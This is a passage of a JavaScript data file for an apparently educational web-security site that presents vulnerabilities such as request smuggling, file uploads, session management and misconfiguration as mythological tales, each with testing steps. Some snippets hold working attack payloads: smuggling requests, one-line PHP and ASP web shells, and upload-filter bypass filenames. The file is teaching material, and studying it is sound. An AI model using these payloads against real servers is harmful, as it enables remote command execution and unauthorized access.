      { name: 'PortSwigger: Directory Traversal', url: 'https://portswigger.net/web-security/file-path-traversal', icon: "fas fa-flask" },
      { name: 'PayloadsAllTheThings: Directory Traversal', url: 'https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal', icon: "fab fa-github" }
    ]
  },
  {
    id: 'myth-request-smuggling',
    slug: 'chimera-of-request-smuggling',
    title: 'The Chimera of Request Smuggling',
    icon: "fas fa-layer-group",
    narrative: "The Chimera, a beast of mismatched parts (frontend proxy and backend server), interprets messages (HTTP requests) differently. By crafting an ambiguous message, an attacker can make one part of the Chimera see one request, while the other part sees a smuggled, malicious second request, leading to chaos, unauthorized access, or cache poisoning.",
    vulnerabilityAnalogy: "HTTP Request Smuggling occurs when an attacker sends an ambiguous HTTP request that is interpreted differently by the frontend (e.g., load balancer, reverse proxy) and backend servers. This desynchronization can allow the attacker to prepend a malicious request to the next user's request, bypassing security controls, hijacking sessions, or accessing internal systems.",
    steps: [
      { id: 'smuggle-s1', title: 'Identify Proxy Architecture', codeSnippet: "# Determine if a frontend proxy and backend server setup is in use.\n# Tools like Burp Suite can help analyze request/response timing and headers.", explanation: "Request smuggling vulnerabilities occur due to differences in request parsing between two or more servers in a chain." },
      { id: 'smuggle-s2', title: 'Test for CL.TE Vulnerability', codeSnippet: "# Frontend uses Content-Length, Backend uses Transfer-Encoding.\nPOST / HTTP/1.1\nHost: vulnerable-website.com\nContent-Length: 11\nTransfer-Encoding: chunked\n\n0\n\nSMUGGLED", explanation: "The 'SMUGGLED' part might be processed by the backend as the start of the next request." },
      { id: 'smuggle-s3', title: 'Test for TE.CL Vulnerability', codeSnippet: "# Frontend uses Transfer-Encoding, Backend uses Content-Length.\nPOST / HTTP/1.1\nHost: vulnerable-website.com\nContent-Length: 4\nTransfer-Encoding: chunked\n\n5c\nSMUGGLED_REQUEST_BODY\n0\n\n", explanation: "The backend might only process up to Content-Length, leaving 'SMUGGLED_REQUEST_BODY' for the next request." },
      { id: 'smuggle-s4', title: 'Test for TE.TE Vulnerability (Obfuscation)', codeSnippet: "# Both use Transfer-Encoding, but one can be tricked into ignoring it with obfuscated headers.\nPOST / HTTP/1.1\nHost: vulnerable-website.com\nTransfer-Encoding: chunked\nTransfer-Encoding: zchunked\n\n0\n\nSMUGGLED", explanation: "If one server processes 'zchunked' as invalid and falls back, while the other accepts it." },
      { id: 'smuggle-s5', title: 'Craft Smuggled Requests for Impact', codeSnippet: "# Goal: Prepend a malicious request to another user's request queue.\n# Example: Smuggle a request to /admin or a request that poisons the cache.\n# Smuggled part might be:\nGET /admin HTTP/1.1\nHost: internal-backend\nFoo: bar", explanation: "The smuggled request executes with the privileges or context of the next request processed by the backend." },
      { id: 'smuggle-s6', title: 'Utilize Tooling', codeSnippet: "# Burp Suite's HTTP Request Smuggler extension.\n# Custom scripts with Python's http.client or requests library.", explanation: "Automated tools can help detect and confirm smuggling vulnerabilities." }
    ],
    resources: [
      { name: 'PortSwigger: HTTP Request Smuggling', url: 'https://portswigger.net/web-security/request-smuggling', icon: "fas fa-flask" },
      { name: 'OWASP: HTTP Request Smuggling', url: 'https://owasp.org/www-community/attacks/HTTP_Request_Smuggling', icon: "fas fa-book-open" },
      { name: 'Detectify Labs: HTTP Request Smuggling in the Wild', url: 'https://labs.detectify.com/2019/07/31/http-request-smuggling-in-the-wild-basics/', icon: "fas fa-newspaper" }
    ]
  },
  {
    id: 'myth-file-upload',
    slug: 'hydras-gift-of-file-uploads',
    title: "The Hydra's Gift (Insecure File Uploads)",
    icon: "fas fa-file-upload",
    narrative: "The Hydra, in a deceptive offering, allows heroes to present gifts (file uploads). If the guardians (the application) don't inspect these gifts carefully for hidden dangers (malicious code), a hero might offer a \"gift\" containing a hidden weapon (a web shell) that can then be used to strike from within the castle walls, granting control.",
    vulnerabilityAnalogy: "Insecure File Upload vulnerabilities allow attackers to upload files with malicious content (e.g., web shells like PHP, ASP, JSP scripts) that can be executed on the server. This typically leads to Remote Code Execution (RCE), allowing the attacker to take full control of the server. Flaws arise from insufficient validation of file types, names, content, or the storage location and access permissions of uploaded files.",
    steps: [
      { id: 'upload-s1', title: 'Identify File Upload Functionality', codeSnippet: "# Look for forms with <input type=\"file\">, API endpoints for uploads.\n# Common in profile pictures, document submissions, content management.", explanation: "Find any feature that allows users to upload files." },
      { id: 'upload-s2', title: 'Test File Type Validation Bypasses', codeSnippet: "# Change Content-Type header: image/jpeg -> application/x-php.\n# Double extensions: shell.php.jpg, shell.jpg.php.\n# Null byte: shell.php%00.jpg (older systems).\n# Case variations: shell.PhP.\n# Special characters in filename.", explanation: "Attempt to circumvent client-side or weak server-side file type checks." },
      { id: 'upload-s3', title: 'Upload Web Shells', codeSnippet: "# Simple PHP shell: <?php system($_GET['cmd']); ?>\n# Simple ASP shell: <% Response.Write(CreateObject(\"WSCRIPT.SHELL\").exec(Request.QueryString(\"cmd\")).StdOut.Readall()) %>\n# Upload and try to access it: /uploads/shell.php?cmd=whoami", explanation: "Attempt to upload a file that allows arbitrary command execution." },
      { id: 'upload-s4', title: 'Check Upload Path and Permissions', codeSnippet: "# Is the upload directory web-accessible? /uploads/, /user_content/.\n# Does the web server execute scripts in this directory?\n# Can you overwrite existing critical files (.htaccess, web.config)?", explanation: "Even if a malicious file is uploaded, it needs to be executable or accessible in a way that triggers its payload." },
      { id: 'upload-s5', title: 'Directory Traversal in Filename/Path', codeSnippet: "# Filename: ../../shell.php\n# If path is constructed from user input, try traversal there.", explanation: "Upload the malicious file to an unexpected, potentially executable directory." },
      { id: 'upload-s6', title: 'Content Validation Bypasses (Advanced)', codeSnippet: "# For files like ZIPs, DOCXs: embed malicious payload inside.\n# Image Polyglots: Create a file that is both a valid image and a valid script.", explanation: "Bypass checks that inspect file content or structure if they are not thorough." }
    ],
    resources: [
      { name: 'OWASP: Unrestricted File Upload', url: 'https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload', icon: "fas fa-book-open" },
      { name: 'PortSwigger: File Upload Vulnerabilities', url: 'https://portswigger.net/web-security/file-upload', icon: "fas fa-flask" },
      { name: 'PayloadsAllTheThings: File Upload', url: 'https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Upload', icon: "fab fa-github" }
    ]
  },
  // New Mythology Items
  {
    id: 'myth-session-shifting-sands',
    slug: 'shifting-sands-of-session-management',
    title: 'The Shifting Sands of Session Management',
    icon: "fas fa-user-clock",
    narrative: "In the digital desert, a user's journey (session) is marked by a magical token. But the sands are ever-shifting; a weak token can be guessed, a fixed token can be imposed by a mirage (attacker), or a token carelessly left by an oasis (insecure transmission) can be stolen by desert bandits, allowing them to impersonate the traveler.",
    vulnerabilityAnalogy: "Broken Session Management refers to flaws in how user sessions are created, maintained, and destroyed. This includes predictable session tokens, session fixation, session hijacking via token theft (e.g., XSS, sniffing), insufficient token entropy, or insecure cookie configurations (missing HttpOnly, Secure flags).",
    steps: [
      { id: 'sess-s1', title: 'Identify Session Tokens', codeSnippet: "# Check cookies (e.g., PHPSESSID, JSESSIONID, custom names).\n# Look for tokens in URL parameters or HTTP headers.", explanation: "Locate how the application tracks user sessions." },
      { id: 'sess-s2', title: 'Analyze Token Entropy & Predictability', codeSnippet: "# Are tokens short? Do they follow a pattern (sequential, timestamp-based)?\n# Use tools like Burp Sequencer to analyze token randomness.", explanation: "Weak or predictable tokens can be guessed or brute-forced." },
      { id: 'sess-s3', title: 'Test for Session Fixation', codeSnippet: "# 1. Attacker obtains a valid session token (e.g., by logging in themselves).\n# 2. Attacker forces this token onto the victim's browser (e.g., via a crafted link: vulnerable.com?SESSIONID=attacker_token).\n# 3. Victim logs in using the attacker-supplied token.\n# 4. Attacker now has access to the victim's authenticated session.", explanation: "Trick a user into using a session token known to the attacker." },
      { id: 'sess-s4', title: 'Test for Session Hijacking Vectors', codeSnippet: "# Is the token transmitted over HTTP (unencrypted)?\n# Can XSS be used to steal the token (document.cookie)?\n# Are tokens logged or exposed in Referer headers to third parties?", explanation: "Find ways an attacker can steal a legitimate user's session token." },
      { id: 'sess-s5', title: 'Check Cookie Security Flags', codeSnippet: "# HttpOnly: Prevents client-side JavaScript access (mitigates XSS token theft).\n# Secure: Ensures cookie is only sent over HTTPS.\n# SameSite (Lax/Strict): Mitigates CSRF-like attacks involving cookies.\n# Path & Domain attributes: Ensure proper scoping.", explanation: "Verify that session cookies are configured with appropriate security attributes." },
      { id: 'sess-s6', title: 'Test Session Timeout and Invalidation', codeSnippet: "# Do sessions expire after a reasonable period of inactivity?\n# Is the session token properly invalidated on logout (server-side)?\n# Can an old session token be reused after logout?", explanation: "Ensure sessions are properly terminated and cannot be reused." }
    ],
    resources: [
      { name: 'OWASP: Session Management Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html', icon: "fas fa-scroll" },
      { name: 'PortSwigger: Session Management', url: 'https://portswigger.net/web-security/sessions', icon: "fas fa-flask" }
    ]
  },
  {
    id: 'myth-misconfig-architects-oversight',
    slug: 'architects-oversight-security-misconfig',
    title: "The Architect's Oversight (Security Misconfiguration)",
    icon: "fas fa-cogs",
    narrative: "A grand digital tower is built, but its architect, in haste or neglect, leaves blueprints exposed (directory listing), service hatches unlocked (unnecessary services), or uses common keys for utility rooms (default credentials). These oversights allow cunning infiltrators to find weaknesses not in the core design, but in its setup and maintenance.",
    vulnerabilityAnalogy: "Security Misconfiguration is one of the most common vulnerabilities. It encompasses a wide range of issues, such as using default credentials, enabling unnecessary services or features, overly permissive configurations, verbose error messages revealing internal details, missing security headers, or exposed administrative interfaces.",
    steps: [
      { id: 'misconf-s1', title: 'Check for Default Credentials', codeSnippet: "# Test known default usernames/passwords for software, frameworks, and devices (e.g., admin:admin, root:toor, default SNMP communities).\n# Consult online lists of default credentials (e.g., CIRT.net, SecLists).", explanation: "Many systems ship with default credentials that are often unchanged." },
      { id: 'misconf-s2', title: 'Identify Unnecessary Services/Features', codeSnippet: "# Perform port scans (Nmap) to identify all listening services.\n# Check server configuration files (httpd.conf, web.xml) for enabled modules or features.\n# Example: Unneeded debug interfaces, sample applications, admin panels.", explanation: "Every enabled service or feature increases the attack surface." },
      { id: 'misconf-s3', title: 'Review HTTP Security Headers', codeSnippet: "# Check for missing or misconfigured headers:\n# - Strict-Transport-Security (HSTS)\n# - Content-Security-Policy (CSP)\n# - X-Content-Type-Options: nosniff\n# - X-Frame-Options: DENY/SAMEORIGIN\n# - Referrer-Policy", explanation: "Proper headers help protect against XSS, clickjacking, and other attacks." },
      { id: 'misconf-s4', title: 'Analyze Verbose Error Messages', codeSnippet: "# Trigger errors in the application (invalid input, non-existent pages).\n# Look for stack traces, internal paths, database error details, or software versions revealed in error messages.", explanation: "Verbose errors can leak sensitive information useful to an attacker." },
      { id: 'misconf-s5', title: 'Discover Exposed Admin Interfaces', codeSnippet: "# Use directory brute-forcing tools (dirsearch, gobuster) with wordlists for common admin paths (e.g., /admin, /administrator, /cpanel, /phpmyadmin).", explanation: "Admin panels should not be publicly accessible or should be strongly protected." },
      { id: 'misconf-s6', title: 'Check File and Directory Permissions', codeSnippet: "# Look for world-writable files/directories, exposed configuration files (.env, .git directory), or directory listings.\n# Test for directory listing: example.com/uploads/", explanation: "Improper permissions can lead to information disclosure or unauthorized modification." }
    ],
    resources: [
      { name: 'OWASP: Security Misconfiguration', url: 'https://owasp.org/Top10/A05_2021-Security_Misconfiguration/', icon: "fas fa-tools" },
      { name: 'PortSwigger: Security Misconfigurations', url: 'https://portswigger.net/web-security/security-misconfiguration', icon: "fas fa-flask" }
    ]
  },
  {
    id: 'myth-dataexpo-oracles-unveiled-secrets',
    slug: 'oracles-unveiled-secrets-data-exposure',
    title: "The Oracle's Unveiled Secrets (Sensitive Data Exposure)",
    icon: "fas fa-scroll-old",
    narrative: "An ancient Oracle, keeper of all knowledge, sometimes speaks too freely or leaves its scrolls (data) in unsecured places. If communication channels are not enchanted (encrypted) or if scrolls are not locked in magical chests (encrypted at rest), eavesdroppers or thieves can steal vital secrets, leading to identity theft, financial loss, or compromised operations.",
    vulnerabilityAnalogy: "Sensitive Data Exposure occurs when an application or system improperly handles, stores, or transmits sensitive information such as PII (Personally Identifiable Information), financial data, health records, credentials, or API keys. This can happen due to lack of encryption, weak encryption, or unintended data leakage.",
    steps: [
      { id: 'dataexpo-s1', title: 'Check for Unencrypted Transmission (No TLS/SSL)', codeSnippet: "# Use browser developer tools or Wireshark to check if sensitive data (login forms, PII) is sent over HTTP instead of HTTPS.\n# Look for mixed content warnings.", explanation: "Data sent over HTTP can be easily intercepted (Man-in-the-Middle)." },
      { id: 'dataexpo-s2', title: 'Inspect API Responses and Client-Side Code', codeSnippet: "# Analyze API responses for excessive data exposure (returning more data than needed by the client).\n# Check JavaScript files and HTML source for hardcoded API keys, credentials, or sensitive comments.", explanation: "APIs might leak internal data; client-side code can inadvertently expose secrets." },
      { id: 'dataexpo-s3', title: 'Assess Data Encryption at Rest', codeSnippet: "# Check if sensitive files, database fields, or backups are encrypted.\n# If encrypted, assess the strength of the encryption algorithm and key management practices.", explanation: "Data stored unencrypted is vulnerable if storage is compromised." },
      { id: 'dataexpo-s4', title: 'Look for Sensitive Data in Logs', codeSnippet: "# Check application logs, web server logs, and system logs for sensitive information like passwords, session tokens, or PII being logged inadvertently.", explanation: "Logs can be a goldmine for attackers if they contain sensitive data and are not properly secured." },
      { id: 'dataexpo-s5', title: 'Test for PII/Sensitive Data in URLs or GET Parameters', codeSnippet: "# Check if sensitive data (e.g., session IDs, PII, API keys) is passed in URL query parameters.\n# Example: example.com/search?user_id=123&query=sensitive_info", explanation: "Data in URLs is often logged by browsers, proxies, and web servers, increasing exposure." },
      { id: 'dataexpo-s6', title: 'Review Data Masking and Tokenization', codeSnippet: "# If sensitive data is displayed (e.g., credit card numbers), check if it's properly masked (e.g., showing only last 4 digits).\n# Is tokenization used appropriately for sensitive data where the original is not needed?", explanation: "Ensure sensitive data is not fully exposed where partial or tokenized data would suffice." }
    ],
    resources: [
      { name: 'OWASP: Sensitive Data Exposure', url: 'https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure', icon: "fas fa-user-secret" },
      { name: 'PortSwigger: Information Disclosure', url: 'https://portswigger.net/web-security/information-disclosure', icon: "fas fa-flask" }
    ]
  },
  {
    id: 'myth-vulncomp-trojan-chariot',
    slug: 'trojan-chariot-vulnerable-components',
    title: 'The Trojan Chariot (Components with Known Vulnerabilities)',
    icon: "fas fa-puzzle-piece",
    narrative: "A magnificent war chariot, assembled from many expertly crafted parts, is paraded by the city. However, one critical component – a wheel axle, perhaps – was sourced from an old, battle-worn design with a known flaw. When the chariot enters fierce battle (production load or attack), this weak component shatters, leading to the chariot's (application's) collapse or capture.",
    vulnerabilityAnalogy: "Using Components with Known Vulnerabilities refers to leveraging outdated or insecure third-party libraries, frameworks, or other software components. Attackers often scan for systems using components with publicly known CVEs (Common Vulnerabilities and Exposures) and exploit them using readily available exploits.",
    steps: [
      { id: 'vulncomp-s1', title: 'Identify Software Components and Versions', codeSnippet: "# Check client-side JavaScript libraries (jQuery, React, Angular versions in browser dev tools or source).\n# Identify server-side frameworks and libraries (e.g., from HTTP headers like 'X-Powered-By', error messages, or manifest files like package.json, pom.xml, Gemfile).", explanation: "Enumerate all third-party components and their versions." },
      { id: 'vulncomp-s2', title: 'Scan for Known Vulnerabilities (SCA Tools)', codeSnippet: "# Use Software Composition Analysis (SCA) tools:\n# - OWASP Dependency-Check (for Java, .NET, Node.js, etc.)\n# - Snyk, Dependabot (GitHub), npm audit, Trivy (for containers which include app dependencies).", explanation: "Automated tools can check identified components against vulnerability databases." },
      { id: 'vulncomp-s3', title: 'Manually Search Vulnerability Databases', codeSnippet: "# For identified components/versions, search online databases:\n# - NVD (National Vulnerability Database): nvd.nist.gov\n# - CVE Details: cvedetails.com\n# - Exploit-DB: exploit-db.com (for public exploits)", explanation: "Cross-reference components with public vulnerability information." },
      { id: 'vulncomp-s4', title: 'Check for Outdated Components', codeSnippet: "# Compare current component versions with the latest stable releases from the vendor/project.\n# Even without a specific CVE, outdated software often lacks security patches for unfound vulns.", explanation: "Outdated software is a risk even if no specific CVE is listed for that exact old version." },
      { id: 'vulncomp-s5', title: 'Test for Publicly Available Exploits', codeSnippet: "# If a CVE is found, search for PoC (Proof of Concept) exploits (e.g., on Exploit-DB, GitHub, Metasploit).\n# (Ethically and with permission) test if the application is vulnerable to these exploits.", explanation: "Confirm if a known vulnerability is exploitable in your specific context." },
      { id: 'vulncomp-s6', title: 'Review Patching and Update Processes', codeSnippet: "# Does the organization have a process for regularly updating third-party components?\n# How quickly are critical patches applied?", explanation: "A strong patching process is crucial for mitigating this risk." }
    ],
    resources: [
      { name: 'OWASP: Using Components with Known Vulnerabilities', url: 'https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/', icon: "fas fa-shield-alt" },
      { name: 'OWASP Dependency-Check', url: 'https://owasp.org/www-project-dependency-check/', icon: "fas fa-tools" },
      { name: 'NVD (National Vulnerability Database)', url: 'https://nvd.nist.gov/', icon: "fas fa-database" }
    ]
  }
];